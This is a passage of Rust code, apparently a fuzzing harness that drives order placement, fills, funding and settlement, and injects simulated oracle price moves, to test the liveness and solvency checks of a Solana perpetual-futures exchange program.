            AccountMeta::new(user.stats_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new(vault, false),
            AccountMeta::new_readonly(self.signer_pda, false),
            AccountMeta::new(token_account, false),
            AccountMeta::new_readonly(token_program_id(), false),
        ];
        // A withdrawal is margin-checked against the user's WHOLE portfolio, so
        // every market they hold must be loadable — pass the full set.
        accounts.extend(self.market_ras(true));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_WITHDRAW, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// Place a perp order.
    ///
    /// Unlike the original version (which hard-coded `MustPostOnly` at a price
    /// that could never cross the $1 oracle, so no order ever filled), the
    /// fuzzer now chooses the order type, the post-only policy, and whether the
    /// price sits inside or outside the spread. Crossing orders are what make
    /// the fill engine, JIT/AMM participation, and taker-fee paths reachable.
    #[allow(clippy::too_many_arguments)]
    pub fn action_place_perp_order(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] dir: u8,
        #[range(1..1_000_000_000u64)] base: u64,
        #[range(0..4u8)] order_kind: u8,
        #[range(0..3u8)] post_only_sel: u8,
        #[range(0..2u8)] cross: u8,
        #[range(1..40u8)] user_order_id: u8,
        #[range(0..2u8)] reduce_only: u8,
    ) -> bool {
        use velocity::{
            controller::position::PositionDirection,
            state::{
                order_params::{OrderParams, PostOnlyParam},
                user::{MarketType, OrderType},
            },
        };

        let direction = if dir == 0 {
            PositionDirection::Long
        } else {
            PositionDirection::Short
        };
        // `cross == 1` prices the order through the oracle so it can match;
        // otherwise it rests away from the mark, as before.
        let price = match (direction, cross) {
            (PositionDirection::Long, 1) => 1_100_000u64, // bid above mark -> crosses asks
            (PositionDirection::Long, _) => 900_000u64,   // resting bid
            (PositionDirection::Short, 1) => 900_000u64,  // ask below mark -> crosses bids
            (PositionDirection::Short, _) => 1_100_000u64, // resting ask
        };
        let order_type = match order_kind {
            0 => OrderType::Limit,
            1 => OrderType::Market,
            2 => OrderType::TriggerLimit,
            _ => OrderType::TriggerMarket,
        };
        let is_trigger = matches!(
            order_type,
            OrderType::TriggerLimit | OrderType::TriggerMarket
        );
        let params = OrderParams {
            order_type,
            market_type: MarketType::Perp,
            direction,
            user_order_id,
            base_asset_amount: base,
            price,
            market_index: 0,
            reduce_only: reduce_only == 1,
            post_only: match post_only_sel {
                0 => PostOnlyParam::None,
                1 => PostOnlyParam::MustPostOnly,
                _ => PostOnlyParam::TryPostOnly,
            },
            // Trigger orders REQUIRE a trigger price; non-trigger orders are
            // rejected outright if one is supplied.
            trigger_price: if is_trigger { Some(price) } else { None },
            ..Default::default()
        };
        let mut buf = Vec::new();
        params.serialize(&mut buf).unwrap();
        self.send_order_ix(user_idx, D_PLACE_PERP_ORDER, buf)
    }

    /// Rewrite the perp oracle account host-side (a fixture poke, not an
    /// instruction — the real `post_pyth_lazer_oracle_update` needs signed Lazer
    /// payloads this tier has no infrastructure for).
    ///
    /// This is the single most valuable action in the harness: it is what lets
    /// the mark/oracle spread open, funding accrue, TWAPs diverge, accounts
    /// become undercollateralized, and oracle-validity gates trip. `slot_lag`
    /// deliberately backdates `posted_slot` so the staleness/validity branches
    /// are reachable too, and `conf` drives the confidence-interval gates.
    pub fn action_move_oracle_price(
        &mut self,
        #[range(0..2u8)] up: u8,
        // Up to 2% per step. Small enough that every intermediate state is one
        // the protocol could really be in, large enough that a handful of steps
        // crosses a maintenance-margin boundary instead of needing dozens.
        #[range(0..200u64)] bps: u64,
        // Confidence as PPM OF PRICE, which is the unit the program compares in
        // (`conf * BID_ASK_SPREAD_PRECISION / price`). An ABSOLUTE conf decouples
        // from the bound as the price walks, which is half of why the old
        // hard-coded 0.1% check in `oracle_is_fresh` was so far off.
        //
        // `wide_conf == 0` writes conf = 0: a pristine oracle, so the common case
        // keeps full downstream coverage of every margin/funding path. Without
        // this split, a flat draw against a 2% band would make ~98% of oracle
        // writes reject downstream -- the mirror image of the old bug.
        // `wide_conf == 1` straddles the guard rail: 0..5% of price, against a 2%
        // perp band (ContractTier::B) and a 10% spot band (AssetTier::Cross), so
        // BOTH sides of `is_conf_too_large` get explored, and asymmetrically
        // between the two markets.
        #[range(0..2u8)] wide_conf: u8,
        #[range(0..50_000u64)] conf_ppm: u64,
        #[range(0..40u64)] slot_lag: u64,
    ) -> bool {
        let pda = self.perp_oracle_pda;
        let conf_ppm = if wide_conf == 1 { conf_ppm } else { 0 };
        self.step_oracle(pda, up == 1, bps, conf_ppm, slot_lag)
    }

    /// Apply a bounded RELATIVE step to an oracle account.
    ///
    /// Deliberately capped at 199bps (<2%) per step, and applied to the CURRENT
    /// price rather than as an absolute jump. Two reasons this is better than a
    /// free-range absolute price, beyond realism:
    ///
    ///  * A wild jump is mostly self-defeating. The oracle guard rails reject a
    ///    price that diverges too far from its TWAP, so an absolute jump to 10x
    ///    just trips `is_oracle_valid_for_action` and the instruction bails
    ///    before reaching the logic under test — it buys a rejection branch, not
    ///    coverage.
    ///  * Real insolvency comes from a levered account meeting a small move, not
    ///    from a 10x gap. Compounding sub-2% steps walks the price to any level
    ///    the fuzzer needs while every intermediate state stays one the protocol
    ///    could actually be in, so a violation found here is reachable in
    ///    production rather than an artifact of an impossible print.
    /// `conf_ppm` is confidence in PARTS PER MILLION OF THE RESULTING PRICE, not
    /// an absolute value — that is the unit `is_conf_too_large` compares in, so
    /// expressing it this way keeps the draw meaningful as the price walks.
    fn step_oracle(
        &mut self,
        pda: Pubkey,
        up: bool,
        bps: u64,
        conf_ppm: u64,
        slot_lag: u64,
    ) -> bool {
        let current = match read_zc::<PythLazerOracle>(&self.ctx, &pda) {
            Some(o) => o.price.max(1),
            None => return false,
        };
        // bps is 0..=199 (both callers draw `#[range(0..200u64)]`), so
        // |delta| < 2% of the current price.
        let delta = (current as i128 * bps as i128 / 10_000).max(if bps > 0 { 1 } else { 0 });
        let next = if up {
            (current as i128).saturating_add(delta)
        } else {
            (current as i128).saturating_sub(delta).max(1)
        };
        let slot = self.ctx.slot();
        // Derive the absolute confidence from the NEW price, so `conf_ppm` means
        // the same thing at every point in the walk.
        let price_out = next.clamp(1, i64::MAX as i128) as i64;
        let conf = ((price_out as u128).saturating_mul(conf_ppm as u128) / 1_000_000) as u64;
        let mut oracle = build_pyth_lazer_oracle(
            price_out,
            conf,
            slot.saturating_sub(slot_lag),
            self.oracle_seq,
        );
        self.oracle_seq += 1;
        // `inject` goes through `svm.set_account`, which overwrites in place.
        inject(&mut self.ctx, pda, &mut oracle);
        true
    }

    /// Cancel a specific order id (best-effort; None cancels all).
    pub fn action_cancel_order(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..8usize)] nth_order: usize,
        #[range(0..2u8)] use_real_id: u8,
        #[range(0..40u32)] blind_id: u32,
    ) -> bool {
        // Keep BOTH paths: a real id reaches the cancel logic, a blind id keeps
        // the "order not found" rejection covered.
        let order_id = match (use_real_id == 1, self.pick_order_id(user_idx, nth_order)) {
            (true, Some(id)) => id,
            _ => blind_id,
        };
        // Option<u32>::Some(order_id)
        let mut args = vec![1u8];
        args.extend_from_slice(&order_id.to_le_bytes());
        self.send_order_ix(user_idx, D_CANCEL_ORDER, args)
    }

    /// Settle perp PnL for market 0 (best-effort).
    pub fn action_settle_pnl(&mut self, #[range(0..NUM_USERS)] user_idx: usize) -> bool {
        let user = self.users[user_idx].clone();
        let args = 0u16.to_le_bytes(); // market_index
        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new_readonly(self.spot_vault_pda, false),
        ];
        accounts.extend(self.market_ras(true));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_SETTLE_PNL, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `settle_multiple_pnls(Vec<market_index>, SettlePnlMode)` — the batch
    /// settle path, including its per-market "try and continue" mode.
    pub fn action_settle_multiple_pnls(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..4u32)] n: u32,
        #[range(0..2u8)] mode: u8,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let mut args = Vec::new();
        args.extend_from_slice(&n.to_le_bytes());
        for k in 0..n {
            args.extend_from_slice(&(k as u16).to_le_bytes());
        }
        args.push(mode.min(1)); // SettlePnlMode
        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new_readonly(self.spot_vault_pda, false),
        ];
        accounts.extend(self.market_ras(true));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_SETTLE_MULTIPLE_PNLS, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `settle_funding_payment` — `[state, user(w)]` + markets. Permissionless,
    /// and only does real work once funding has actually accrued (which needs a
    /// mark/oracle spread, i.e. `action_move_oracle_price`).
    pub fn action_settle_funding_payment(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let should_work = self.user_is_live(&user.user_pda)
            && self.oracle_is_fresh(OracleOwner::Perp)
            && self.oracle_is_fresh(OracleOwner::Spot1)
            && self
                .read_perp_market()
                .map(|pm| pm.status == MarketStatus::Active)
                .unwrap_or(false);
        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(user.user_pda, false),
        ];
        accounts.extend(self.market_ras(false));
        let ok = self
            .ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_SETTLE_FUNDING_PAYMENT, &[]),
            })
            // Permissionless ix, but a transaction still needs a fee payer.
            .signers(&[&self.crank.clone()])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false);
        // `settle_funding_payment` is a pure no-op when there is nothing owed,
        // so with a fresh oracle and an active market it must NEVER revert.
        // A revert here strands funding for that user.
        if should_work && !ok {
            self.crank_failures.push("settle_funding_payment");
        }
        ok
    }

    /// `update_funding_rate(market_index)` — `[state, perp_market(w), oracle]`.
    /// Gated on the funding period having elapsed, so pair it with `warp`.
    pub fn action_update_funding_rate(&mut self, #[range(0..3u16)] market_index: u16) -> bool {
        // Precondition for "this crank MUST work": market 0, Active, a full
        // funding period elapsed, and a fresh oracle. Anything else is a lawful
        // refusal (wrong index, period not elapsed, stale price).
        let should_work = market_index == 0
            && self
                .read_perp_market()
                .map(|pm| {
                    let now = self
                        .ctx
                        .svm
                        .get_sysvar::<anchor_lang::prelude::Clock>()
                        .unix_timestamp;
                    // TWO funding periods, not one. The program does not use
                    // naive elapsed time: `next_update_wait` aligns the cadence
                    // to period boundaries, so a full period can elapse and the
                    // update still legitimately be early
                    // ("time_until_next_update = 920 seconds"). Requiring two
                    // periods guarantees a boundary has passed, so a revert
                    // after that really is a liveness break.
                    pm.status == MarketStatus::Active
                        && pm.market_stats.funding_period > 0
                        && now.saturating_sub(pm.last_funding_rate_ts)
                            >= pm.market_stats.funding_period.saturating_mul(2)
                })
                .unwrap_or(false)
            && self.oracle_is_fresh(OracleOwner::Perp);
        let ok = self
            .ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(self.perp_market_pda, false),
                    AccountMeta::new_readonly(self.perp_oracle_pda, false),
                ],
                data: ix_data(D_UPDATE_FUNDING_RATE, &market_index.to_le_bytes()),
            })
            .signers(&[&self.crank.clone()])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false);
        if should_work && !ok {
            self.crank_failures.push("update_funding_rate");
        }
        ok
    }

    /// Does this User account still exist AND is it still owned by the program?
    ///
    /// `delete_user` / `force_delete_user` close the account, after which every
    /// instruction taking it fails with `AccountOwnedByWrongProgram` — a
    /// completely lawful refusal. Any "this crank must succeed" precondition has
    /// to exclude deleted users or it reports the protocol's correct behaviour
    /// as a liveness break.
    fn user_is_live(&self, pda: &Pubkey) -> bool {
        match self.ctx.get_account(pda) {
            Ok(acct) => {
                acct.owner == self.program_id && acct.data.len() >= 8 + std::mem::size_of::<User>()
            }
            Err(_) => false,
        }
    }

    /// Is an injected oracle valid enough that the program's margin / funding
    /// reads will accept it?
    ///
    /// Mirrors `math::oracle::oracle_validity` on the verdicts every
    /// crank-liveness caller cares about — NonPositive, StaleFor*, TooUncertain,
    /// TooVolatile — and is deliberately conservative on each, so a "must work"
    /// precondition never claims liveness on a borderline price.
    ///
    /// PREVIOUSLY WRONG, and it silenced this whole family. The confidence test
    /// was a hard-coded `conf * 1000 <= price` (0.1% of price) — 500x tighter
    /// than any guard rail the program applies. `action_move_oracle_price` draws
    /// confidence across the full width of a price, so ~99.9% of draws made this
    /// return false and every gated check (crank liveness, family XVIII) was
    /// vacuous. The bound now comes from the exchange's OWN
    /// `State::oracle_guard_rails` and the owning market's tier multiplier, which
    /// is the same product `is_conf_too_large` compares against.
    fn oracle_is_fresh(&self, owner: OracleOwner) -> bool {
        let Some(state) = read_zc::<State>(&self.ctx, &self.state_pda()) else {
            return false;
        };
        let rails = state.oracle_guard_rails.validity;

        // (oracle pda, the owning market's tier multiplier, the TWAP the program
        // compares the live price against for volatility).
        let (pda, max_mult, risk_ema) = match owner {
            OracleOwner::Perp => {
                let Some(m) = self.read_perp_market() else {
                    return false;
                };
                let Ok(mult) = m.get_max_confidence_interval_multiplier() else {
                    return false;
                };
                (
                    self.perp_oracle_pda,
                    mult,
                    m.market_stats.historical_oracle_data.last_oracle_price_twap,
                )
            }
            OracleOwner::Spot1 => {
                let Some(m) = self.read_spot_market_1() else {
                    return false;
                };
                let Ok(mult) = m.get_max_confidence_interval_multiplier() else {
                    return false;
                };
                (
                    self.spot_1_oracle_pda,
                    mult,
                    m.historical_oracle_data.last_oracle_price_twap,
                )
            }
        };

        let Some(o) = read_zc::<PythLazerOracle>(&self.ctx, &pda) else {
            return false;
        };

        // NonPositive.
        if o.price <= 0 {
            return false;
        }

        // StaleForMargin / StaleForAMM. The program's thresholds are far looser
        // than 2 slots; being well inside both is the point.
        if self.ctx.slot().saturating_sub(o.posted_slot) > 2 {
            return false;
        }

        // TooUncertain — the program's exact arithmetic. BID_ASK_SPREAD_PRECISION
        // and PERCENTAGE_PRECISION are the same constant.
        let conf_pct_of_price =
            (o.conf as u128).saturating_mul(PERCENTAGE_PRECISION) / (o.price as u128);
        if conf_pct_of_price > (rails.confidence_interval_max_size as u128) * (max_mult as u128) {
            return false;
        }

        // TooVolatile. `step_oracle` walks the price in <=2% compounding steps
        // against a TWAP no action here refreshes, so a long enough action chain
        // CAN cross `too_volatile_ratio` — a lawful refusal that would otherwise
        // be reported as a liveness break. Cheap insurance today; load-bearing
        // the moment the per-iteration action cap is raised.
        let hi = o.price.max(risk_ema) as i128;
        let lo = o.price.min(risk_ema).max(1) as i128;
        if hi / lo > rails.too_volatile_ratio as i128 {
            return false;
        }

        true
    }

    /// `update_perp_bid_ask_twap` — `[state, perp_market(w), oracle,
    /// keeper_stats, authority(s)]`. Feeds the bid/ask TWAPs that funding and
    /// the spread logic read.
    pub fn action_update_perp_bid_ask_twap(
        &mut self,
        #[range(0..NUM_USERS)] keeper_idx: usize,
        #[range(0..2u8)] setup: u8,
    ) -> bool {
        // COMPOUND: the caller must be a STAKED keeper.
        //
        // Two gates guard the body: `keeper_stats.can_update_bid_ask_twap()` and
        // `if_staked_quote_asset_amount >= 1000 USDC`. That second value is a
        // CACHE on UserStats, not a live read of the stake account — it is only
        // refreshed by `update_user_quote_asset_insurance_stake`. So staking
        // alone is not enough; without the refresh the cached figure stays 0 and
        // the handler stops at the min-stake check.
        if setup == 1 {
            let _ = self.action_initialize_if_stake(keeper_idx, 0);
            let _ = self.action_add_if_stake(keeper_idx, 2_000 * QUOTE_PRECISION as u64);
            let _ = self.action_update_user_quote_asset_if_stake(keeper_idx);
        }
        let keeper = self.users[keeper_idx].clone();
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new(self.perp_market_pda, false),
                    AccountMeta::new_readonly(self.perp_oracle_pda, false),
                    AccountMeta::new_readonly(keeper.stats_pda, false),
                    AccountMeta::new_readonly(keeper.keypair.pubkey(), true),
                ],
                data: ix_data(D_UPDATE_PERP_BID_ASK_TWAP, &[]),
            })
            .signers(&[&keeper.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `update_amms(Vec<market_index>)` — `[state, authority(s)]` + markets. The
    /// AMM refresh crank (repeg / k adjustment / spread recompute).
    pub fn action_update_amms(
        &mut self,
        #[range(0..NUM_USERS)] keeper_idx: usize,
        #[range(1..4u32)] n: u32,
    ) -> bool {
        let keeper = self.users[keeper_idx].clone();
        let mut args = Vec::new();
        args.extend_from_slice(&n.to_le_bytes());
        for k in 0..n {
            args.extend_from_slice(&(k as u16).to_le_bytes());
        }
        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new_readonly(keeper.keypair.pubkey(), true),
        ];
        accounts.extend(self.market_ras(false));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_UPDATE_AMMS, &args),
            })
            .signers(&[&keeper.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- the fill engine --------------------------------------------------
    //
    // Reachable only now that orders can cross. Each of these is a *counterparty*
    // instruction: one user acts as filler/maker against another's order, which
    // is the entire matching/settlement surface the harness previously could not
    // touch at all.

    /// `fill_perp_order(Option<order_id>, Option<maker_order_id>)` —
    /// `[state, authority(s), filler(w), filler_stats(w), user(w), user_stats(w)]`.
    /// The maker (if any) is passed via remaining_accounts after the markets.
    pub fn action_fill_perp_order(
        &mut self,
        #[range(0..NUM_USERS)] taker_idx: usize,
        #[range(0..NUM_USERS)] filler_idx: usize,
        #[range(0..2u8)] with_order_id: u8,
        #[range(0..8usize)] nth_order: usize,
        #[range(0..2u8)] with_maker: u8,
    ) -> bool {
        let taker = self.users[taker_idx].clone();
        let filler = self.users[(filler_idx + 1) % NUM_USERS].clone();
        // A real open order id (see pick_order_id) — otherwise the handler stops
        // at the lookup and the matching engine is never entered.
        let order_id = self.pick_order_id(taker_idx, nth_order);
        let mut args = Vec::new();
        push_opt(
            &mut args,
            with_order_id == 1 && order_id.is_some(),
            &order_id.unwrap_or(0).to_le_bytes(),
        );
        push_opt(&mut args, false, &[]); // _maker_order_id (unused by the handler)

        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new_readonly(filler.keypair.pubkey(), true),
            AccountMeta::new(filler.user_pda, false),
            AccountMeta::new(filler.stats_pda, false),
            AccountMeta::new(taker.user_pda, false),
            AccountMeta::new(taker.stats_pda, false),
        ];
        accounts.extend(self.market_ras(false));
        if with_maker == 1 {
            // A maker is the (user, user_stats) pair of a third party — here the
            // remaining user, so a genuine two-sided match is possible.
            let maker = self.users[(taker_idx + 1) % NUM_USERS].clone();
            accounts.push(AccountMeta::new(maker.user_pda, false));
            accounts.push(AccountMeta::new(maker.stats_pda, false));
        }
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_FILL_PERP_ORDER, &args),
            })
            .signers(&[&filler.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `place_and_take_perp_order(params, Option<success_condition>)` —
    /// `[state, user(w), user_stats(w), authority(s)]`. Places an aggressive
    /// order and immediately takes against the book/AMM in one instruction.
    pub fn action_place_and_take_perp_order(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..2u8)] dir: u8,
        #[range(1..1_000_000_000u64)] base: u64,
        #[range(0..2u8)] with_success_condition: u8,
        #[range(0..2u8)] success_condition: u8,
    ) -> bool {
        use velocity::{
            controller::position::PositionDirection,
            state::{
                order_params::{OrderParams, PostOnlyParam},
                user::{MarketType, OrderType},
            },
        };

        let user = self.users[user_idx].clone();
        let direction = if dir == 0 {
            PositionDirection::Long
        } else {
            PositionDirection::Short
        };
        // Aggressive price: cross the mark so the take leg can actually fill.
        let price = if dir == 0 { 1_200_000u64 } else { 800_000u64 };
        let params = OrderParams {
            order_type: OrderType::Limit,
            market_type: MarketType::Perp,
            direction,
            base_asset_amount: base,
            price,
            market_index: 0,
            post_only: PostOnlyParam::None,
            ..Default::default()
        };
        let mut args = Vec::new();
        params.serialize(&mut args).unwrap();
        push_opt(&mut args, with_success_condition == 1, &[success_condition]);

        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new(user.stats_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
        ];
        accounts.extend(self.market_ras(false));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_PLACE_AND_TAKE_PERP_ORDER, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `place_and_make_perp_order(params, taker_order_id)` —
    /// `[state, user(w), user_stats(w), taker(w), taker_stats(w), authority(s)]`.
    /// The maker side of a two-sided match against a named taker order.
    pub fn action_place_and_make_perp_order(
        &mut self,
        #[range(0..NUM_USERS)] maker_idx: usize,
        #[range(0..2u8)] dir: u8,
        #[range(1..1_000_000_000u64)] base: u64,
        #[range(0..8usize)] nth_taker_order: usize,
    ) -> bool {
        use velocity::{
            controller::position::PositionDirection,
            state::{
                order_params::{OrderParams, PostOnlyParam},
                user::{MarketType, OrderType},
            },
        };

        let maker = self.users[maker_idx].clone();
        // Pick a counterparty that actually HAS an open order rather than
        // assuming the next user does. Hardcoding `(maker_idx + 1)` means the
        // action silently no-ops whenever that particular user's book is empty,
        // which is most of the time.
        let (taker_idx, taker_order_id) = match (0..NUM_USERS)
            .map(|k| (maker_idx + 1 + k) % NUM_USERS)
            .filter(|i| *i != maker_idx)
            .find_map(|i| self.pick_order_id(i, nth_taker_order).map(|id| (i, id)))
        {
            Some(v) => v,
            None => return false,
        };
        let taker = self.users[taker_idx].clone();
        let direction = if dir == 0 {
            PositionDirection::Long
        } else {
            PositionDirection::Short
        };
        let price = if dir == 0 { 1_000_000u64 } else { 1_000_000u64 };
        let params = OrderParams {
            order_type: OrderType::Limit,
            market_type: MarketType::Perp,
            direction,
            base_asset_amount: base,
            price,
            market_index: 0,
            // `place_and_make` requires an IOC **post-only** limit order
            // specifically (InvalidOrderIOCPostOnly otherwise) — post-only alone
            // is not enough, the ImmediateOrCancel bit must be set too.
            post_only: PostOnlyParam::MustPostOnly,
            bit_flags: velocity::state::order_params::OrderParamsBitFlag::ImmediateOrCancel as u8,
            ..Default::default()
        };
        let mut args = Vec::new();
        params.serialize(&mut args).unwrap();
        args.extend_from_slice(&taker_order_id.to_le_bytes());

        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(maker.user_pda, false),
            AccountMeta::new(maker.stats_pda, false),
            AccountMeta::new(taker.user_pda, false),
            AccountMeta::new(taker.stats_pda, false),
            AccountMeta::new_readonly(maker.keypair.pubkey(), true),
        ];
        accounts.extend(self.market_ras(false));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_PLACE_AND_MAKE_PERP_ORDER, &args),
            })
            .signers(&[&maker.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `trigger_order(order_id)` — `[state, authority(s), filler(w), user(w),
    /// user_stats]`. Fires a conditional (TriggerLimit/TriggerMarket) order once
    /// the oracle crosses its trigger price, which `action_move_oracle_price`
    /// now makes possible.
    pub fn action_trigger_order(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(0..NUM_USERS)] filler_idx: usize,
        #[range(0..8usize)] nth_order: usize,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let filler = self.users[(filler_idx + 1) % NUM_USERS].clone();
        // COMPOUND: guarantee a *triggerable* trigger order exists.
        //
        // `trigger_order` does real work only when the trigger condition is
        // actually met; otherwise it returns early. Waiting for the fuzzer to
        // (a) place a trigger order and (b) move the oracle across its trigger
        // price, in that order, within one iteration is vanishingly unlikely —
        // which is why this handler sat at 10%. Place one priced off the LIVE
        // oracle so the default `Above` condition (`oracle_price >
        // trigger_price`) is already satisfied.
        if self
            .pick_order_id_filtered(user_idx, nth_order, true)
            .is_none()
        {
            use velocity::{
                controller::position::PositionDirection,
                state::{
                    order_params::{OrderParams, PostOnlyParam},
                    user::{MarketType, OrderTriggerCondition, OrderType},
                },
            };
            let oracle_price = match read_zc::<PythLazerOracle>(&self.ctx, &self.perp_oracle_pda) {
                Some(o) if o.price > 1 => o.price as u64,
                _ => return false,
            };
            // Strictly below the oracle, so `Above` is met the moment it rests.
            let trigger_price = oracle_price.saturating_sub(oracle_price / 100).max(1);
            let params = OrderParams {
                order_type: OrderType::TriggerMarket,
                market_type: MarketType::Perp,
                direction: PositionDirection::Long,
                base_asset_amount: 10_000_000,
                price: 0,
                market_index: 0,
                post_only: PostOnlyParam::None,
                trigger_price: Some(trigger_price),
                trigger_condition: OrderTriggerCondition::Above,
                ..Default::default()
            };
            let mut buf = Vec::new();
            if params.serialize(&mut buf).is_ok() {
                let _ = self.send_order_ix(user_idx, D_PLACE_PERP_ORDER, buf);
            }
        }
        // trigger_order takes a bare (non-Option) order id AND rejects
        // non-trigger orders, so restrict the pick to trigger types.
        let order_id = match self.pick_order_id_filtered(user_idx, nth_order, true) {
            Some(id) => id,
            None => return false,
        };
        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new_readonly(filler.keypair.pubkey(), true),
            AccountMeta::new(filler.user_pda, false),
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new_readonly(user.stats_pda, false),
        ];
        accounts.extend(self.market_ras(false));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_TRIGGER_ORDER, &order_id.to_le_bytes()),
            })
            .signers(&[&filler.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// `revert_fill` — `[state, authority(s), filler(w), filler_stats(w)]`. The
    /// filler-reward clawback path taken when a fill turns out to be invalid.
    pub fn action_revert_fill(&mut self, #[range(0..NUM_USERS)] filler_idx: usize) -> bool {
        let filler = self.users[filler_idx].clone();
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts: vec![
                    AccountMeta::new_readonly(self.state_pda(), false),
                    AccountMeta::new_readonly(filler.keypair.pubkey(), true),
                    AccountMeta::new(filler.user_pda, false),
                    AccountMeta::new(filler.stats_pda, false),
                ],
                data: ix_data(D_REVERT_FILL, &[]),
            })
            .signers(&[&filler.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    // ---- order management (same account set as cancel_order) --------------
    //
    // All of these run against the fixture as-is: they only need the State, the
    // user's own User account, and the two markets already injected. They are
    // the cheapest way to reach the rest of the order surface — no oracle, no
    // fill, no second market required.

    /// `remaining_accounts` for any instruction that touches the perp market.
    ///
    /// ORDER IS LOAD-BEARING. `load_maps` consumes oracles first (until it hits
    /// an account that is neither an external-oracle-program account nor a
    /// velocity-owned Prelaunch/PythLazer account), then spot markets, then perp
    /// markets. Since the perp market now has a real PythLazer oracle, ANY
    /// instruction that loads the perp market must also pass that oracle here —
    /// otherwise `OracleMap::get_price_data` fails to find it and the whole
    /// instruction errors out. The quote spot market keeps
    /// `OracleSource::QuoteAsset` (hard-coded $1) and needs no oracle account.
    fn market_ras(&self, spot_writable: bool) -> Vec<AccountMeta> {
        // Both oracles first (market 0 is QuoteAsset and needs none), then both
        // spot markets, then the perp market. `SpotMarketMap::load` keys on the
        // market_index embedded in the account data, so spot order does not
        // matter — but the oracles/spot/perp grouping does.
        vec![
            AccountMeta::new(self.perp_oracle_pda, false),
            AccountMeta::new(self.spot_1_oracle_pda, false),
            if spot_writable {
                AccountMeta::new(self.spot_market_pda, false)
            } else {
                AccountMeta::new_readonly(self.spot_market_pda, false)
            },
            if spot_writable {
                AccountMeta::new(self.spot_market_1_pda, false)
            } else {
                AccountMeta::new_readonly(self.spot_market_1_pda, false)
            },
            AccountMeta::new(self.perp_market_pda, false),
        ]
    }

    /// Per-market plumbing: (spot_market_pda, vault, if_vault, user token account).
    fn spot_of(&self, market_index: u16, user: &UserAcct) -> (Pubkey, Pubkey, Pubkey, Pubkey) {
        if market_index == 1 {
            (
                self.spot_market_1_pda,
                self.spot_vault_1_pda,
                self.if_vault_1_pda,
                user.token_account_1,
            )
        } else {
            (
                self.spot_market_pda,
                self.spot_vault_pda,
                self.if_vault_pda,
                user.token_account,
            )
        }
    }

    /// Is this account insolvent under ANY valuation the margin engine could
    /// choose — i.e. do its liabilities exceed its assets even when both are
    /// priced as generously as possible for the account?
    ///
    /// REPLACES `is_structurally_insolvent`, WHICH WAS VACUOUS. That predicate
    /// required "a borrow with NO deposit anywhere". But `liquidate_spot`
    /// validates the ASSET side first — `WrongSpotBalanceType` if the asset
    /// market's position is not a Deposit, then `InvalidSpotPosition` if its
    /// token amount is zero — both roughly 130 lines BEFORE the margin
    /// calculation that can emit 6004 `SufficientCollateral`. So a victim with no
    /// deposit never reaches 6004, and one that does reach it has a deposit by
    /// construction. The two conditions were mutually exclusive: `liq_refusals`
